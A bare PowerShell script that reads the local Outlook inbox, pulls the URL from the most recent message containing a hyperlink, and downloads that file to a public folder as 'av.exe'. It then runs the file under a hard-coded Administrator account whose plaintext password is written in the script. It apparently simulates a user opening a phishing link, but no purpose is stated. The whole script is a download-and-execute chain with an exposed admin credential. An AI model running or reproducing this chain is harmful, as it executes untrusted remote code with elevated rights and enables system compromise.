$outlook=new-object -com outlook.application;
$mapi=$outlook.GetNameSpace('MAPI');
$inbox=$mapi.GetDefaultFolder(6);
$mail=$inbox.Items;
$text=($mail | where-object {$_.Body -like '*HYPERLINK*'} |Select-Object -last 1).Body;
$startix=$text.IndexOf('HYPERLINK');
$len=$text.IndexOf('click here')-$startix-12;
$url=$text.Substring($startix+11, $len)

$client = New-Object System.Net.WebClient
$client.DownloadFile($url, "C:\Users\Public\av.exe")

$username = 'Administrator'
$password = ConvertTo-SecureString 'xPwjuhcm8P' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $password
Start-Process cmd -Credential $credential -ArgumentList '/C "C:\Users\Public\av.exe"'
